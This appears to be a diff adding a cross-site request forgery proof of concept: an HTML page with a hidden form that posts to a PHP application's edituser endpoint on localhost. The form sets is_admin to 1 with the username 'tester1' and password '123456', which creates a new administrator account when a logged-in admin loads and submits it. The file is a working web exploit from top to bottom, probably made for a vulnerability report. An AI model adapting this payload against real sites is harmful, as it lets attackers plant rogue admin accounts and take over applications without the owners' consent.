@@ -1,0 +1,20 @@
+<html>
+
+<body>
+    <script>
+        history.pushState('', '', '/')
+    </script>
+    <form action="http://localhost/index.php?mod=site&op=edituser&act=manager&do=user&beid=1" method="POST">
+        <input type="hidden" name="id" value="" />
+        <input type="hidden" name="is&#95;admin" value="1" />
+        <!-- add a admin -->
+        <input type="hidden" name="store" value="0" />
+        <input type="hidden" name="username" value="tester1" />
+        <input type="hidden" name="newpassword" value="123456" />
+        <input type="hidden" name="confirmpassword" value="123456" />
+        <input type="hidden" name="submit" value="%E6%8F%90%E4%BA%A4" />
+        <input type="submit" value="Submit request" />
+    </form>
+</body>
+
+</html>
